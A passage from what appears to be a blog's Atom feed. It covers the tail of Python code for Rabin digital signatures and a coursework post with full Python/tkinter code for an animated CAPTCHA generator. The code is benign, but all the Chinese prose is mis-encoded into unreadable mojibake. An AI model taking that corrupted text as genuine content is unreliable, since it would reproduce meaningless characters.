p)</span><br><span class="line">        rp = p * <span class="built_in">pow</span>(h, (q + <span class="number">1</span>) // <span class="number">4</span>, q) * <span class="built_in">pow</span>(p, q - <span class="number">2</span>, q)</span><br><span class="line">        s = (lp + rp) % n</span><br><span class="line">        <span class="keyword">if</span> (s * s) % n == h % n:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> s, <span class="string">b&#x27;\x00&#x27;</span> * i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">n: <span class="built_in">int</span>, digest: <span class="built_in">bytes</span>, s: <span class="built_in">int</span>, u: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param n: rabin public key</span></span><br><span class="line"><span class="string">    :param digest: digest of signed message</span></span><br><span class="line"><span class="string">    :param s: S of signature</span></span><br><span class="line"><span class="string">    :param u: padding U of signature</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hash_to_int(digest + u) % n == (s * s) % n</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h1><ul><li>[1] W. Diffie and M. Hellman, IEEE Transactions On Information Theory 22, 644â€“654 (1976).</li><li>[2] R. L. Rivest, A. Shamir, and L. Adleman, Communications Of The ACM 21,120â€“126 (1978).</li><li>[3] M. O. Rabin, MIT Technical Report MIT/LCS/TR-212 (1979).</li><li>[4] N. Koblitz and A. J. Menezes, Journal of Cryptology 20, 3â€“37 (2007).</li><li>[5] D. Boneh, â€œSimplified OAEP For The RSA And Rabin Functions,â€ in Advances In Cryptology-Crypto 2001 (Springer, 2001), pp. 275â€“291.</li><li>[6] S. D. Galbraith, Mathematics Of Public Key Cryptography (Cambridge University Press, 2012).</li><li>[7] M. A. Asbullah and M. R. K. Ariffin, Malaysian Journal of Mathematical Sciences 11 (2016).</li><li>[8] aaron67, Rabin æ•°å­—ç­¾å (2021). <a href="https://aaron67.cc/2021/07/10/rabin-signatures/">https://aaron67.cc/2021/07/10/rabin-signatures/</a>.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h3&gt;&lt;p&gt;Rabin å¯†ç ç³»ç»Ÿæ˜¯ç¬¬ä¸€ä¸ªéå¯¹ç§°å¯†ç ç³»ç»Ÿï¼Œç”±&lt;a href=&quot;https://en.wikipedia.org/wiki/Michael_</summary>
      
    
    
    
    
    <category term="å¯†ç å­¦" scheme="https://zxy.link/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="è¯¾ç¨‹æŠ¥å‘Š" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E6%8A%A5%E5%91%8A/"/>
    
  </entry>
  
  <entry>
    <title>Pythonå®ç°åŠ¨æ€éªŒè¯ç (åŒ…å«GUI)</title>
    <link href="https://zxy.link/posts/8aab642a/"/>
    <id>https://zxy.link/posts/8aab642a/</id>
    <published>2021-12-07T16:00:00.000Z</published>
    <updated>2022-01-22T12:43:56.780Z</updated>
    
    <content type="html"><![CDATA[<div class="note info flat"><p>æœ¬é¡¹ç›®æ˜¯ã€Šç½‘ç»œå®‰å…¨Aã€‹è¯¾ç¨‹çš„ä¸€é¡¹é™„åŠ ä½œä¸š</p></div><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æœ¬é¡¹ç›®ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªç±»ï¼Œä¹Ÿåˆ†åˆ«ä»£è¡¨äº†æœ¬é¡¹ç›®çš„ä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ã€‚é¦–å…ˆæ˜¯<code>DynamicVerificationCode</code>ç±»ï¼Œä¸»è¦å®ç°ç”ŸæˆåŠ¨æ€éªŒè¯ç æ¯ä¸€å¸§çš„PNGå›¾åƒæ–‡ä»¶ï¼Œæ˜¯æœ¬é¡¹ç›®çš„æ ¸å¿ƒï¼›ç„¶åæ˜¯<code>LabelDisplay</code>ç±»ï¼Œè´Ÿè´£å°†gifæ–‡ä»¶åŠ¨æ€æ˜¾ç¤ºåœ¨ç•Œé¢ä¸­ï¼›æœ€åæ˜¯<code>GUI</code>ç±»ï¼Œè´Ÿè´£å°†PNGåºåˆ—åˆç§°ä¸ºgifæ–‡ä»¶ï¼Œå¹¶åŸºäºtkinteræ„å»ºå›¾å½¢ç•Œé¢ã€‚</p><p><img src="/img/13bfc486090acb2c0be59588d2c11352.png" alt="P193\#y1"></p><h2 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h2><p>ä¸‹é¢æ¥åˆ†æä¸€ä¸‹<code>DynamicVerificationCode</code>ç±»çš„ä»£ç ã€‚è¦å®ç°åŠ¨æ€éªŒè¯ç ï¼Œä¸»è¦å®ç°ä»¥ä¸‹å‡ ä¸ªåŠŸèƒ½ï¼šç”Ÿæˆéšæœºé¢œè‰²ï¼Œç”Ÿæˆéšæœºå­—ç¬¦ï¼ˆåŒ…å«æ•°å­—å’Œå¤§å°å†™å­—æ¯ï¼‰ã€‚ç”Ÿæˆå¹²æ‰°çº¿æ®µï¼Œç”Ÿæˆå¹²æ‰°ç‚¹ä»¥åŠå°†æ¯ä¸€å¸§åˆç§°ä¸ºgifæ–‡ä»¶ã€‚ä»¥ä¸Šå‡ ä¸ªåŠŸèƒ½åˆ†åˆ«å¯¹åº”ä»¥ä¸‹å‡ ä¸ªå‡½æ•°ï¼š<code>Colorconfusion()</code>, <code>StrInDVC()</code>, <code>LineConfusion()</code>, <code>ArcConfusion()</code>, <code>Create()</code>ã€‚</p><p>é¦–å…ˆæ˜¯<code>Colorconfusion()</code>å‡½æ•°ï¼Œå› ä¸ºä½¿ç”¨RGBè‰²å½©æ¨¡å¼ï¼Œå› æ­¤åªéœ€è¦ç”Ÿæˆä¸‰ä¸ª0-255ä¹‹é—´çš„éšæœºæ•°å³å¯ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«è°ƒç”¨ç”ŸæˆéšæœºèƒŒæ™¯é¢œè‰²å’Œç”Ÿæˆéšæœºå­—ä½“é¢œè‰²ã€‚<code>StrInDVC()</code>å‡½æ•°ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦ç”Ÿæˆæ•°å­—å’Œå¤§å°å†™å­—æ¯å„è‡ªèŒƒå›´å†…çš„ASCIIç å€¼å³å¯ï¼Œå¦‚å°å†™å­—æ¯åˆ™ä½¿ç”¨<code>chr(random.randint(97, 122))</code>ç”Ÿæˆã€‚ç„¶åæ˜¯<code>LineConfusion()</code>ï¼Œç”±äºgifçš„é•¿å’Œå®½æ˜¯ç¡®å®šçš„ï¼Œå› æ­¤ç”Ÿæˆçº¿æ®µåªéœ€ç”Ÿæˆä¸¤ä¸ªéšæœºåæ ‡å³å¯ï¼Œåˆ†åˆ«ä½œä¸ºèµ·ç‚¹å’Œç»ˆç‚¹ï¼Œç„¶åè°ƒç”¨PIL <code>Image.line()</code>å‡½æ•°å³å¯ç”Ÿæˆçº¿æ®µã€‚å¯¹äº<code>ArcConfusion()</code>å‡½æ•°åˆ™éœ€è¦è°ƒç”¨PIL <code>Image.point()</code>å‡½æ•°ï¼ŒåŒæ ·æ˜¯ç”Ÿæˆéšæœºæ•°ä¸å†èµ˜è¿°ã€‚</p><p>æœ€ååœ¨<code>Create()</code>å‡½æ•°å†…ï¼Œé¦–å…ˆç”Ÿæˆéšæœºå­—ç¬¦ï¼Œç„¶åè®¾ç½®ä¸€ä¸ªå›¾åƒåºåˆ—<code>picSequence</code>ï¼Œè®¾ç½®å­—ä½“ä¸ºCOOPBL.TTFï¼ˆæ³¨ï¼šè‹¥ç¯å¢ƒä¸­ä¸åŒ…å«æœ¬å­—ä½“å°†æŠ¥é”™ï¼‰ï¼Œè°ƒç”¨PIL <code>Image.text()</code>å‡½æ•°åœ¨æ¯å¸§å›¾åƒä¸Šå†™å…¥å­—ç¬¦ï¼Œæ³¨æ„å­—ç¬¦çš„ä½ç½®ä¹Ÿéœ€è¦éšæœºç”Ÿæˆï¼Œç„¶ååˆ†åˆ«è°ƒç”¨<code>self.LineConfusion(createpic)</code>å’Œ<code>self.ArcConfusion(createpic)</code>ç”Ÿæˆéšæœºçº¿å’Œç‚¹ï¼Œæœ€åè¿”å›å›¾åƒåºåˆ—å³å¯ã€‚</p><h2 id="æ•ˆæœå±•ç¤º"><a href="#æ•ˆæœå±•ç¤º" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h2><p>ä¸»ç•Œé¢å±•ç¤ºï¼ŒåŒ…å«è¾“å…¥æ¡†ã€æäº¤æŒ‰é’®å’Œåˆ·æ–°æŒ‰é’®ã€‚</p><p><img src="/img/maingui.jpg" alt="maingui"></p><p>å½“æäº¤å†…å®¹ä¸ºç©ºæ—¶ï¼Œå°†æç¤ºç©ºå€¼è­¦å‘Šä¿¡æ¯ã€‚</p><p><img src="/img/5a5e2078788aff0f39d05f306afbe432.jpeg" alt="P201\#y1"></p><p>å½“æäº¤äº†é”™è¯¯çš„éªŒè¯ç æ—¶ï¼Œå°†æŠ¥é”™ã€‚</p><p><img src="/img/96b2076adfb2fb144c1ee0097d49564e.jpeg" alt="P203\#y1"></p><p>å½“éªŒè¯ç æ­£ç¡®æ—¶ï¼Œæç¤ºéªŒè¯é€šè¿‡ã€‚</p><p><img src="/img/ec6d830acd36951abce68e1a6dacf4ba.jpeg" alt="P206\#y1"></p><p>ç‚¹å‡»åˆ·æ–°æŒ‰é’®åï¼ŒåŠ¨æ€éªŒè¯ç æ›´æ¢ï¼Œå½“ç„¶éªŒè¯ä¿¡æ¯ä¹Ÿéšä¹‹æ›´æ¢ã€‚</p><p><img src="/img/9f27126f29b436ffe64baa065cb343bb.jpeg" alt="P207\#y1"></p><h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><div class="note danger flat"><p>æ³¨æ„å­—ä½“è¢«è®¾ç½®ä¸º<code>COOPBL.TTF</code>ï¼Œè‹¥ç³»ç»Ÿä¸­ä¸åŒ…å«æœ¬å­—ä½“å°†æŠ¥é”™</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/12/08</span></span><br><span class="line"><span class="comment"># @Author  : zxy</span></span><br><span class="line"><span class="comment"># @Version : 1.0</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> tkinter.messagebox</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> imageio</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFont</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageTk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LabelDisplay</span>(<span class="params">Label</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, master, filename</span>):</span></span><br><span class="line">        image = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">        sequence = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                sequence.append(image.copy())</span><br><span class="line">                image.seek(<span class="built_in">len</span>(sequence))</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.delay = image.info[<span class="string">&#x27;duration&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            self.delay = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">        begin = sequence[<span class="number">0</span>].convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">        self.frames = [ImageTk.PhotoImage(begin)]</span><br><span class="line"></span><br><span class="line">        Label.__init__(self, master, image=self.frames[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        frameTemp = sequence[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> image <span class="keyword">in</span> sequence[<span class="number">1</span>:]:</span><br><span class="line">            frameTemp.paste(image)</span><br><span class="line">            frame = frameTemp.convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">            self.frames.append(ImageTk.PhotoImage(frame))</span><br><span class="line"></span><br><span class="line">        self.frameID = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self.cancel = self.after(self.delay, self.play)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">play</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.config(image=self.frames[self.frameID])</span><br><span class="line">        self.frameID += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.frameID == <span class="built_in">len</span>(self.frames):</span><br><span class="line">            self.frameID = <span class="number">0</span></span><br><span class="line">        self.cancel = self.after(self.delay, self.play)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicVerificationCode</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, breadth=<span class="number">200</span>, vertical=<span class="number">55</span>, strcount=<span class="number">5</span>, fontsize=<span class="number">40</span>, arccount=<span class="number">20</span>, linecount=<span class="number">3</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 number_of_frames=<span class="number">30</span></span>):</span></span><br><span class="line">        <span class="comment"># æ¨èçš„å‡ ç§æ–¹æ¡ˆï¼š</span></span><br><span class="line">        <span class="comment"># (self, width=200, height=55, code_count=5, font_size=40, point_count=20, line_count=3, frame_count=30)</span></span><br><span class="line">        <span class="comment"># (self, width=600, height=200, code_count=6, font_size=90, point_count=120, line_count=30, frame_count=90)</span></span><br><span class="line">        <span class="comment"># (self, width=1200, height=400, code_count=8, font_size=150, point_count=1200, line_count=55, frame_count=90)</span></span><br><span class="line">        self.breadth = breadth</span><br><span class="line">        self.vertical = vertical</span><br><span class="line">        self.strcount = strcount</span><br><span class="line">        self.fontsize = fontsize</span><br><span class="line">        self.arccount = arccount</span><br><span class="line">        self.linecount = linecount</span><br><span class="line">        self.number_of_frames = number_of_frames</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Colorconfusion</span>(<span class="params">self</span>):</span></span><br><span class="line">        colorr = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        colorg = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        colorb = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        <span class="keyword">return</span> colorr, colorg, colorb</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">StrInDVC</span>(<span class="params">self</span>):</span></span><br><span class="line">        number = <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">9</span>))</span><br><span class="line">        xiaoxieap = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">        daxieap = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">        reStr = random.choice([number, xiaoxieap, daxieap])</span><br><span class="line">        <span class="keyword">return</span> reStr</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LineConfusion</span>(<span class="params">self, createpic=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.linecount):</span><br><span class="line">            sourcex = random.randint(<span class="number">0</span>, self.breadth)</span><br><span class="line">            destx = random.randint(<span class="number">0</span>, self.breadth)</span><br><span class="line">            sourcey = random.randint(<span class="number">0</span>, self.vertical)</span><br><span class="line">            desty = random.randint(<span class="number">0</span>, self.vertical)</span><br><span class="line">            createpic.line((sourcex, sourcey, destx, desty), fill=self.Colorconfusion())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ArcConfusion</span>(<span class="params">self, createpic=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.arccount):</span><br><span class="line">            createpic.point([random.randint(<span class="number">0</span>, self.breadth), random.randint(<span class="number">0</span>, self.vertical)],</span><br><span class="line">                            fill=self.Colorconfusion())</span><br><span class="line">            x = random.randint(<span class="number">0</span>, self.breadth)</span><br><span class="line">            y = random.randint(<span class="number">0</span>, self.vertical)</span><br><span class="line">            createpic.arc((x, y, x + <span class="number">4</span>, y + <span class="number">4</span>), <span class="number">0</span>, <span class="number">90</span>, fill=self.Colorconfusion())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Create</span>(<span class="params">self</span>):</span></span><br><span class="line">        StrInDVCList = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.strcount):</span><br><span class="line">            s = self.StrInDVC()</span><br><span class="line">            StrInDVCList.append(s)</span><br><span class="line"></span><br><span class="line">        background = self.Colorconfusion()</span><br><span class="line"></span><br><span class="line">        picSequence = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.number_of_frames):</span><br><span class="line">            DVC = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (self.breadth, self.vertical), background)</span><br><span class="line">            createpic = ImageDraw.Draw(DVC)</span><br><span class="line"></span><br><span class="line">            fontInDVC = os.path.join(os.getcwd(), <span class="string">&quot;COOPBL.TTF&quot;</span>)</span><br><span class="line">            font = ImageFont.truetype(fontInDVC, size=self.fontsize)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i, code <span class="keyword">in</span> <span class="built_in">enumerate</span>(StrInDVCList):</span><br><span class="line">                y = random.randint(<span class="built_in">int</span>(-<span class="number">0.133</span> * self.vertical), <span class="built_in">int</span>(<span class="number">0.267</span> * self.vertical))</span><br><span class="line">                x = random.randint(<span class="number">14</span>, <span class="number">22</span>)</span><br><span class="line">                createpic.text((x + i * (self.breadth / self.strcount), y), code, self.Colorconfusion(), font=font)</span><br><span class="line"></span><br><span class="line">            self.LineConfusion(createpic)</span><br><span class="line"></span><br><span class="line">            self.ArcConfusion(createpic)</span><br><span class="line"></span><br><span class="line">            PNGfile = BytesIO()</span><br><span class="line">            DVC.save(PNGfile, <span class="string">&quot;png&quot;</span>)</span><br><span class="line">            data = PNGfile.getvalue()</span><br><span class="line">            PNGfile.close()</span><br><span class="line"></span><br><span class="line">            data = imageio.imread(data, <span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">            picSequence.append(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> picSequence, <span class="string">&quot;&quot;</span>.join(StrInDVCList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GUI</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.ans = self.DVCCreate()</span><br><span class="line">        self.root = Tk()</span><br><span class="line">        self.root.geometry(<span class="string">&#x27;500x400+500+300&#x27;</span>)</span><br><span class="line">        self.root.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        self.root.title(<span class="string">&quot;Dynamic Verification Code&quot;</span>)</span><br><span class="line">        self.anim = LabelDisplay(self.root, <span class="string">&#x27;Dynamic_verification_code.gif&#x27;</span>)</span><br><span class="line">        self.anim.pack(side=<span class="string">&quot;top&quot;</span>)</span><br><span class="line">        self.entryCode = tkinter.Entry(self.root)</span><br><span class="line">        self.entryCode.place(x=<span class="number">150</span>, y=<span class="number">200</span>, width=<span class="number">200</span>, height=<span class="number">30</span>)</span><br><span class="line">        self.w = Label(self.root, text=<span class="string">&quot;Please enter the verification code below:&quot;</span>)</span><br><span class="line">        self.w.place(x=<span class="number">121</span>, y=<span class="number">168</span>)</span><br><span class="line">        self.ww = Label(self.root, text=<span class="string">&quot;Cybersecurity Coursework  Build Date: December 8, 2021&quot;</span>, font=(<span class="string">&#x27;Consolas&#x27;</span>, <span class="number">8</span>),</span><br><span class="line">                        fg=<span class="string">&#x27;DarkRed&#x27;</span>)</span><br><span class="line">        self.ww.place(x=<span class="number">135</span>, y=<span class="number">382</span>)</span><br><span class="line">        self.www = Label(self.root,</span><br><span class="line">                         text=<span class="string">&quot;You can refer to the comments to adjust the parameters of the DynamicVerificationCode(&quot;</span></span><br><span class="line">                              <span class="string">&quot;) function to adjust the style of the dynamic verification code.&quot;</span>,</span><br><span class="line">                         wraplength=<span class="number">244</span>,</span><br><span class="line">                         font=(<span class="string">&#x27;Consolas&#x27;</span>, <span class="number">10</span>))</span><br><span class="line">        self.www.place(x=<span class="number">135</span>, y=<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">        self.btnCheck = tkinter.Button(self.root, text=<span class="string">&#x27;Submit&#x27;</span>, width=<span class="number">20</span>, height=<span class="number">2</span>, command=self.check)</span><br><span class="line">        self.btnCheck.pack(side=<span class="string">&#x27;bottom&#x27;</span>, pady=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        self.btnRe = tkinter.Button(self.root, text=<span class="string">&#x27;Refresh&#x27;</span>, width=<span class="number">20</span>, height=<span class="number">2</span>, command=self.Re)</span><br><span class="line">        self.btnRe.place(x=<span class="number">158</span>, y=<span class="number">75</span>)</span><br><span class="line">        self.root.mainloop()</span><br><span class="line">        self.Re()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DVCCreate</span>(<span class="params">self</span>):</span></span><br><span class="line">        img = DynamicVerificationCode(<span class="number">200</span>, <span class="number">55</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">20</span>, <span class="number">3</span>, <span class="number">30</span>)</span><br><span class="line">        <span class="comment"># å®½åº¦ï¼Œé«˜åº¦ï¼Œä½æ•°ï¼Œå­—ä½“å¤§å°ï¼Œå¹²æ‰°ç‚¹æ•°é‡ï¼Œå¹²æ‰°çº¿æ®µæ•°é‡ï¼Œå¸§æ•°</span></span><br><span class="line">        seq, ans = img.Create()</span><br><span class="line">        imageio.mimsave(<span class="string">&quot;Dynamic_verification_code.gif&quot;</span>, seq, <span class="string">&#x27;GIF&#x27;</span>, duration=<span class="number">0.3</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The verification code characters are &quot;</span> + ans)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># print(self.ans)</span></span><br><span class="line">        <span class="keyword">if</span> self.entryCode.get() == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            tkinter.messagebox.showerror(<span class="string">&#x27;DVC Fatal Error&#x27;</span>, <span class="string">&#x27;The verification code is empty!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.entryCode.get() == self.ans:</span><br><span class="line">                tkinter.messagebox.showwarning(<span class="string">&#x27;DVC Success&#x27;</span>, <span class="string">&#x27;Successfully verified!&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tkinter.messagebox.showerror(<span class="string">&#x27;DVC Fail&#x27;</span>, <span class="string">&#x27;Verification code error! Please try again.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Re</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">        self.ans = self.DVCCreate()</span><br><span class="line">        self.anim.pack_forget()</span><br><span class="line">        self.anim = LabelDisplay(self.root, <span class="string">&#x27;Dynamic_verification_code.gif&#x27;</span>)</span><br><span class="line">        self.anim.pack(side=<span class="string">&quot;top&quot;</span>)</span><br><span class="line">        self.root.update()</span><br><span class="line">        <span class="comment"># return ans</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span 